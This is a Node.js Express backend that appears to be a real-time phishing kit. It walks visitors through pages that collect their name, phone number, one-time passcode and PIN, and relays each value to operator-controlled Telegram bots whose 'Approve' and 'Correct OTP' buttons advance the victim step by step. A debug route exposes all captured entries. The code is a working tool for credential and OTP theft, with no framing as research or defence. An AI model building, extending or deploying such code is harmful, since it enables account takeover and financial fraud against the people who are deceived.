require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
// CONFIG
// ============================================================
const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ============================================================
// LOGGER
// ============================================================
function ts() {
  return new Date().toISOString();
}

const log = {
  info: (...a) => console.log(`[${ts()}] [INFO]`, ...a),
  warn: (...a) => console.warn(`[${ts()}] [WARN]`, ...a),
  error: (...a) => console.error(`[${ts()}] [ERROR]`, ...a),
  debug: (...a) => console.log(`[${ts()}] [DEBUG]`, ...a),
  tg: (...a) => console.log(`[${ts()}] [TELEGRAM]`, ...a),
};

// ============================================================
// IN-MEMORY STORES
// ============================================================
const phoneRequests = {};
const otpRequests = {};
const pinRequests = {};
const requestMeta = {};

// ============================================================
// BOTS LOADING
// ============================================================
const bots = [];
Object.keys(process.env).forEach((key) => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) {
    bots.push({ botId: `bot${i}`, token, chatId });
  }
});

log.info('==============================================');
log.info(`🚀 STARTING SERVER`);
log.info(`🌐 PORT          : ${PORT}`);
log.info(`🌐 BACKEND_DOMAIN: ${DOMAIN || '(NOT SET!)'}`);
log.info(`🤖 BOTS LOADED   : ${bots.length}`);
bots.forEach((b) => {
  log.info(`   • ${b.botId} | chatId=${b.chatId} | token=${b.token.slice(0, 10)}...`);
});
log.info('==============================================');

if (!DOMAIN) {
  log.warn('⚠️  BACKEND_DOMAIN is not set — webhooks will NOT be registered!');
}
if (bots.length === 0) {
  log.warn('⚠️  No bots loaded. Check BOT1_TOKEN / BOT1_CHATID env vars.');
}

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Request logger
app.use((req, res, next) => {
  const start = Date.now();
  log.debug(`➡️  ${req.method} ${req.originalUrl} | ip=${req.ip}`);
  if (req.body && Object.keys(req.body).length) {
    log.debug(`   body: ${JSON.stringify(req.body).slice(0, 300)}`);
  }
  res.on('finish', () => {
    log.debug(`⬅️  ${req.method} ${req.originalUrl} → ${res.statusCode} (${Date.now() - start}ms)`);
  });
  next();
});

// ============================================================
// HELPERS
// ============================================================
function getBot(botId) {
  const bot = bots.find((b) => b.botId === botId);
  if (!bot) log.warn(`❓ Unknown botId: ${botId}`);
  return bot;
}

async function sendTelegram(bot, text, buttons = []) {
  const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
  const payload = {
    chat_id: bot.chatId,
    text,
    reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined,
  };
  log.tg(`📤 sendMessage → ${bot.botId} (chat=${bot.chatId})`);
  try {
    const r = await axios.post(url, payload, { timeout: 10000 });
    log.tg(`✅ sendMessage OK (msg_id=${r.data?.result?.message_id})`);
    return r.data;
  } catch (e) {
    log.error(`❌ sendMessage FAILED for ${bot.botId}:`, e.response?.data || e.message);
    throw e;
  }
}

async function answerCallback(bot, id, text = '') {
  const url = `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`;
  try {
    await axios.post(url, { callback_query_id: id, text }, { timeout: 10000 });
    log.tg(`✅ answerCallbackQuery OK (${id})`);
  } catch (e) {
    log.error(`❌ answerCallbackQuery FAILED:`, e.response?.data || e.message);
  }
}

// ============================================================
// WEBHOOK MANAGEMENT
// ============================================================
async function setWebhook(bot) {
  if (!DOMAIN) {
    log.warn(`⚠️  Skipping webhook for ${bot.botId} — DOMAIN not set`);
    return;
  }
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  const api = `https://api.telegram.org/bot${bot.token}/setWebhook?url=${encodeURIComponent(url)}`;
  log.info(`🔗 Setting webhook for ${bot.botId} → ${url}`);
  try {
    const r = await axios.get(api, { timeout: 10000 });
    log.info(`✅ setWebhook ${bot.botId}:`, JSON.stringify(r.data));
  } catch (e) {
    log.error(`❌ setWebhook FAILED for ${bot.botId}:`, e.response?.data || e.message);
  }
}

async function deleteWebhook(bot) {
  try {
    const r = await axios.get(
      `https://api.telegram.org/bot${bot.token}/deleteWebhook?drop_pending_updates=false`,
      { timeout: 10000 }
    );
    log.info(`✅ deleteWebhook ${bot.botId}:`, JSON.stringify(r.data));
  } catch (e) {
    log.error(`❌ deleteWebhook FAILED for ${bot.botId}:`, e.response?.data || e.message);
  }
}

async function getWebhookInfo(bot) {
  try {
    const r = await axios.get(
      `https://api.telegram.org/bot${bot.token}/getWebhookInfo`,
      { timeout: 10000 }
    );
    return r.data;
  } catch (e) {
    log.error(`❌ getWebhookInfo FAILED for ${bot.botId}:`, e.response?.data || e.message);
    return null;
  }
}

async function setAllWebhooks() {
  for (const bot of bots) {
    await setWebhook(bot);
    const info = await getWebhookInfo(bot);
    if (info) {
      log.info(`📊 WebhookInfo ${bot.botId}:`, JSON.stringify(info.result || info));
    }
  }
}

// ============================================================
// PHONE STEP
// ============================================================
app.post('/submit-phone', (req, res) => {
  try {
    const { name, phone, botId } = req.body;
    log.info(`📱 /submit-phone | name=${name} phone=${phone} botId=${botId}`);
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    phoneRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };
    log.info(`🆕 Created phoneRequest ${requestId}`);

    sendTelegram(
      bot,
      `📱 PHONE VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` },
        ],
      ]
    ).catch(() => {});

    res.json({ requestId });
  } catch (e) {
    log.error('❌ /submit-phone error:', e);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-phone/:id', (req, res) => {
  const id = req.params.id;
  const result = phoneRequests[id];
  log.debug(`🔍 /check-phone/${id} → ${result}`);
  if (result === true) return res.json({ redirect: 'code.html' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ============================================================
// OTP STEP
// ============================================================
app.post('/submit-otp', (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    log.info(`🔐 /submit-otp | name=${name} phone=${phone} otp=${otp} botId=${botId}`);
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    otpRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };
    log.info(`🆕 Created otpRequest ${requestId}`);

    sendTelegram(
      bot,
      `🔐 OTP VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` },
        ],
      ]
    ).catch(() => {});

    res.json({ requestId });
  } catch (e) {
    log.error('❌ /submit-otp error:', e);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', (req, res) => {
  const id = req.params.id;
  const result = otpRequests[id];
  log.debug(`🔍 /check-otp/${id} → ${result}`);
  res.json({ approved: result ?? null });
});

// ============================================================
// PIN STEP
// ============================================================
app.post('/submit-pin', (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    log.info(`🔐 /submit-pin | name=${name} phone=${phone} pin=*** botId=${botId}`);
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };
    log.info(`🆕 Created pinRequest ${requestId}`);

    sendTelegram(
      bot,
      `🔐 PIN VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
        ],
      ]
    ).catch(() => {});

    res.json({ requestId });
  } catch (e) {
    log.error('❌ /submit-pin error:', e);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', (req, res) => {
  const id = req.params.id;
  const result = pinRequests[id];
  log.debug(`🔍 /check-pin/${id} → ${result}`);
  res.json({ approved: result ?? null });
});

// ============================================================
// TELEGRAM CALLBACK WEBHOOK
// ============================================================
app.post('/telegram-webhook/:botId', async (req, res) => {
  const botId = req.params.botId;
  log.info(`📨 WEBHOOK HIT: /telegram-webhook/${botId}`);
  log.debug(`   Full update: ${JSON.stringify(req.body).slice(0, 800)}`);

  const bot = getBot(botId);
  if (!bot) {
    log.warn(`❌ Webhook for unknown botId: ${botId}`);
    return res.sendStatus(404);
  }

  const cb = req.body.callback_query;
  if (!cb) {
    // Could be a message, channel post, etc. Just ACK.
    log.debug(`   No callback_query — ignoring`);
    return res.sendStatus(200);
  }

  log.info(`👉 CALLBACK from ${bot.botId}: data="${cb.data}" from=${cb.from?.id}`);

  // ACK immediately so Telegram doesn't retry
  res.sendStatus(200);
  answerCallback(bot, cb.id).catch(() => {});

  try {
    const [action, requestId] = cb.data.split(':');
    const meta = requestMeta[requestId];
    log.info(`   action=${action} requestId=${requestId} meta=${JSON.stringify(meta)}`);

    let feedback = '';

    if (action === 'phone_ok') {
      phoneRequests[requestId] = true;
      feedback = '✅ Phone approved – redirecting to OTP page';
    } else if (action === 'phone_bad') {
      phoneRequests[requestId] = false;
      feedback = '❌ Phone rejected';
    } else if (action === 'otp_ok') {
      otpRequests[requestId] = true;
      feedback = '✅ OTP approved – redirecting to PIN page';
    } else if (action === 'otp_bad') {
      otpRequests[requestId] = false;
      feedback = '❌ OTP rejected';
    } else if (action === 'pin_ok') {
      pinRequests[requestId] = true;
      feedback = '✅ PIN approved – redirecting to success page';
    } else if (action === 'pin_bad') {
      pinRequests[requestId] = false;
      feedback = '❌ PIN rejected';
    } else {
      log.warn(`   ⚠️ Unknown action: ${action}`);
      return;
    }

    log.info(`   ✅ Stored: ${action} → ${requestId}`);

    if (feedback && meta) {
      await sendTelegram(
        bot,
        `📝 ACTION TAKEN\n👤 Name: ${meta.name || '—'}\n📞 Phone: ${meta.phone || '—'}\n${feedback}`
      );
    }
  } catch (e) {
    log.error('❌ Callback processing error:', e);
  }
});

// ============================================================
// BOT ENTRY POINT
// ============================================================
app.get('/bot/:botId', (req, res) => {
  const botId = req.params.botId;
  log.info(`🤖 /bot/${botId}`);
  const bot = getBot(botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ============================================================
// DEBUG ROUTES
// ============================================================
app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map((b) => ({ botId: b.botId, chatId: b.chatId })),
  });
});

app.get('/debug/webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).json({ error: 'Invalid bot' });
  const info = await getWebhookInfo(bot);
  res.json(info);
});

app.get('/debug/webhook', async (req, res) => {
  const results = {};
  for (const bot of bots) {
    results[bot.botId] = await getWebhookInfo(bot);
  }
  res.json(results);
});

app.get('/debug/set-webhooks', async (req, res) => {
  await setAllWebhooks();
  res.json({ ok: true, message: 'Webhooks re-registered' });
});

app.get('/debug/delete-webhooks', async (req, res) => {
  for (const bot of bots) await deleteWebhook(bot);
  res.json({ ok: true, message: 'Webhooks deleted' });
});

app.get('/debug/state', (req, res) => {
  res.json({
    phoneRequests,
    otpRequests,
    pinRequests,
    requestMeta,
  });
});

app.get('/debug/send-test/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.status(404).json({ error: 'Invalid bot' });
  const requestId = uuidv4();
  requestMeta[requestId] = { name: 'TEST', phone: '0000', botId: bot.botId };
  await sendTelegram(
    bot,
    `🧪 TEST MESSAGE\n🆔 Ref: ${requestId}`,
    [
      [
        { text: '✅ Test OK', callback_data: `phone_ok:${requestId}` },
        { text: '❌ Test Bad', callback_data: `phone_bad:${requestId}` },
      ],
    ]
  );
  res.json({ ok: true, requestId });
});

app.get('/health', (req, res) => {
  res.json({ ok: true, uptime: process.uptime(), bots: bots.length });
});

// ============================================================
// GLOBAL ERROR HANDLERS
// ============================================================
process.on('unhandledRejection', (reason) => {
  log.error('🔥 Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
  log.error('🔥 Uncaught Exception:', err);
});
process.on('SIGTERM', () => {
  log.warn('⚠️  SIGTERM received, shutting down');
  process.exit(0);
});

// ============================================================
// START SERVER
// ============================================================
setAllWebhooks()
  .then(() => {
    app.listen(PORT, () => {
      log.info('==============================================');
      log.info(`🚀 Server running on port ${PORT}`);
      log.info(`🌐 Public URL : ${DOMAIN || '(not set)'}`);
      log.info(`🔗 Webhook URL: ${DOMAIN}/telegram-webhook/<botId>`);
      log.info(`🐛 Debug info : ${DOMAIN}/debug/webhook`);
      log.info('==============================================');
    });
  })
  .catch((e) => {
    log.error('❌ Failed during startup webhook registration:', e);
    app.listen(PORT, () => log.info(`🚀 Server running (with webhook errors) on port ${PORT}`));
  });